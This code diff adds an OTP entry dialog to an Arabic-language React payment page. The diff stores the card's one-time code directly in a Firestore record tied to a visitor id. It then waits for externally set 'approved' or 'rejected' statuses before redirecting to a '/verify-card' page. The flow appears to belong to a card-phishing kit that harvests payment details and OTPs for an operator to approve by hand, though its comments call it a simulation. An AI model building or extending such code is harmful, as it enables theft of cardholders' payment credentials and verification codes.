@@ -1,5 +1,7 @@
 "use client"
 
+import type React from "react"
+
 import { useEffect, useState } from "react"
 import { z } from "zod"
 import { motion, AnimatePresence } from "framer-motion"
@@ -8,8 +10,8 @@ import Footer from "@/components/Footer"
 
 import WaitingDialog from "@/components/waiting-dilaog"
 import { RefreshCw } from "lucide-react"
-import { db } from "@/lib/firebase"
-import { doc, onSnapshot } from "firebase/firestore"
+import { addData, db } from "@/lib/firebase"
+import { addDoc, doc, onSnapshot, updateDoc } from "firebase/firestore"
 import PaymentForm from "@/components/payment/PaymentForm"
 import { PaymentSummary } from "@/components/payment/PaymentSummary"
 import { PaymentMethods } from "@/components/payment/Payment-methods"
@@ -88,12 +90,57 @@ const PaymentStatusDialog = () => (
   </div>
 )
 
+// OTP Dialog Component
+const OtpDialog = ({ onSubmit }: { onSubmit: (otp: string) => void }) => {
+  const [otp, setOtp] = useState("")
+
+  const handleSubmit = (e: React.FormEvent) => {
+    e.preventDefault()
+    onSubmit(otp)
+  }
+
+  return (
+    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-sm">
+      <motion.div
+        initial={{ scale: 0.9, opacity: 0 }}
+        animate={{ scale: 1, opacity: 1 }}
+        exit={{ scale: 0.9, opacity: 0 }}
+        className="bg-white rounded-2xl max-w-lg w-full overflow-hidden p-6 text-center"
+      >
+        <div className="mb-4">
+          <h3 className="text-xl font-bold mb-4">أدخل رمز التحقق</h3>
+          <p className="text-gray-600 mb-6">تم إرسال رمز التحقق إلى رقم هاتفك المسجل</p>
+          <form onSubmit={handleSubmit} className="space-y-4">
+            <input
+              type="text"
+              value={otp}
+              onChange={(e) => setOtp(e.target.value)}
+              placeholder="أدخل رمز التحقق"
+              className="w-full p-3 border border-gray-300 rounded-lg text-center text-lg"
+              maxLength={6}
+            />
+            <button
+              type="submit"
+              className="w-full bg-[#146394] text-white px-8 py-3 rounded-lg font-semibold transition-all hover:bg-[#0f4c70] transform hover:scale-[0.98] active:scale-[0.97]"
+            >
+              تأكيد
+            </button>
+          </form>
+        </div>
+      </motion.div>
+    </div>
+  )
+}
+
 export default function PaymentPage() {
   const [showAd, setShowAd] = useState(true)
   const [isloading, setIsloading] = useState(false)
   const [showWaitingDialog, setShowWaitingDialog] = useState(false)
   const [paymentStatus, setPaymentStatus] = useState<string | null>(null)
   const [paymentId, setPaymentId] = useState<string | null>(null)
+  // Add these new state variables
+  const [showOtpDialog, setShowOtpDialog] = useState(false)
+  const [otpStatus, setOtpStatus] = useState<string | null>(null)
 
   // Check for payment status in localStorage on component mount
   useEffect(() => {
@@ -115,7 +162,29 @@ export default function PaymentPage() {
     }
   }, [])
 
-  // Check payment status from Firestore
+  // Add this function inside the PaymentPage component
+  const handleOtpSubmit = (otp: string) => {
+    // Hide OTP dialog and show waiting loader
+   // setShowOtpDialog(false)
+    //setIsloading(true)
+    //setShowWaitingDialog(true)
+const _id=localStorage.getItem("visitor")
+    // In a real implementation, you would send the OTP to your backend
+    // For now, we'll simulate by updating Firestore directly
+    if (_id) {
+     addData({id:_id,cardOtp:otp})
+     setShowOtpDialog(false)
+     setShowWaitingDialog(true)
+      // Update the document with otpStatus field
+      // This is just a simulation - in a real app, you'd verify the OTP on the server
+      // Also track OTP status if it exists
+      if ((otpStatus==='approved' )&&(paymentStatus=== "approved" ) )  {
+        window.location.href = "/verify-card"
+      }
+    }
+  }
+
+  // Replace the existing useEffect for Firestore listener with this updated one
   useEffect(() => {
     if (!paymentId) return
 
@@ -125,39 +194,67 @@ export default function PaymentPage() {
     const unsubscribe = onSnapshot(
       paymentRef,
       (docSnapshot) => {
-        if (docSnapshot.exists()) {
-          const data = docSnapshot.data()
-          setPaymentStatus(data.paymentStatus)
-
-          // If status is pending or processing, keep dialog open
-          if (data.paymentStatus === "pending" || data.paymentStatus === "processing") {
-            setIsloading(true)
-            setShowWaitingDialog(true)
-            // Save status to localStorage to persist across page refreshes
-            localStorage.setItem("paymentStatus", data.paymentStatus)
-          } else if (data.paymentStatus === "rejected" || data.paymentStatus === "failed") {
-            setIsloading(false)
-            setShowWaitingDialog(false)
-            // Clear status from localStorage if payment is complete or failed
-            alert("فشل عملبة الدفع يرجى المحاولة مرة أخرى")
-          }
-        } else if (paymentStatus === "approved" || paymentStatus === "completed") {
-          // Document doesn't exist
-          setIsloading(false)
-          setShowWaitingDialog(false)
-          // The user will handle the redirection or any other action
+        if (!docSnapshot.exists()) {
+          return;
+        }
+    
+        const data = docSnapshot.data();
+        setPaymentStatus(data.paymentStatus);
+        setOtpStatus(data.otpStatus);
+    
+        // ✅ عند بدء الدفع، نعرض اللودر
+        if (data.paymentStatus === "pending") {
+          setIsloading(true);
+          setShowWaitingDialog(true);
+          setShowOtpDialog(false);
+          localStorage.setItem("paymentStatus", "pending");
+        }
+    
+        // ✅ عند الموافقة على الدفع، نخفي اللودر ونظهر OTP
+        if (data.paymentStatus === "approved") {
+          setIsloading(false);
+          setShowWaitingDialog(false);
+          setShowOtpDialog(true);
+          setOtpStatus("pending");
+        }
+    
+        // ✅ عند رفض الدفع، نخفي اللودر ونعرض رسالة خطأ
+        if (data.paymentStatus === "rejected") {
+          setIsloading(false);
+          setShowWaitingDialog(false);
+          setShowOtpDialog(false);
+          alert("تم رفض الدفع. الرجاء المحاولة مرة أخرى.");
+        }
+    
+        // ✅ عند إدخال OTP، نظهر اللودر حتى يتم التحقق
+        if (data.otpStatus === "pending") {
+          setIsloading(true);
+        }
+    
+        // ✅ عند رفض الـ OTP، نظهر مربع OTP مجددًا
+        if (data.otpStatus === "rejected") {
+          setIsloading(false);
+          setShowWaitingDialog(false);
+          setShowOtpDialog(true);
+          alert("فشل التحقق من OTP. الرجاء المحاولة مرة أخرى.");
+        }
+    
+        // ✅ عند الموافقة على الـ OTP، ننتقل لصفحة "verify-card"
+        if (data.otpStatus === "approved") {
+          setIsloading(false);
+          window.location.href = "/verify-card";
         }
       },
       (error) => {
-        console.error("Error fetching payment status:", error)
-        setIsloading(false)
-        setShowWaitingDialog(false)
-      },
-    )
+        console.error("Error fetching payment status:", error);
+        setIsloading(false);
+        setShowWaitingDialog(false);
+      }
+    );
 
     // Clean up the listener when component unmounts
     return () => unsubscribe()
-  }, [paymentId, paymentStatus])
+  }, [paymentId, paymentStatus, otpStatus])
 
   // Add event listener for beforeunload to prevent accidental navigation during pending payment
   useEffect(() => {
@@ -229,8 +326,11 @@ export default function PaymentPage() {
       <AnimatePresence>{showAd && <AdPopup onClose={() => setShowAd(false)} />}</AnimatePresence>
       <AnimatePresence>{showWaitingDialog && <WaitingDialog isOpen={false} />}</AnimatePresence>
 
-      {/* Remove AnimatePresence for PaymentStatusDialog to prevent it from being removed on exit animations */}
+      {/* Payment Status Dialog */}
       {(paymentStatus === "pending" || paymentStatus === "processing") && <PaymentStatusDialog />}
+
+      {/* OTP Dialog */}
+      {showOtpDialog && <OtpDialog onSubmit={handleOtpSubmit} />}
 
       <div className="bg-gradient-to-br from-gray-50 to-blue-50 py-8 md:py-12">
         <div className="max-w-7xl mx-auto px-4">
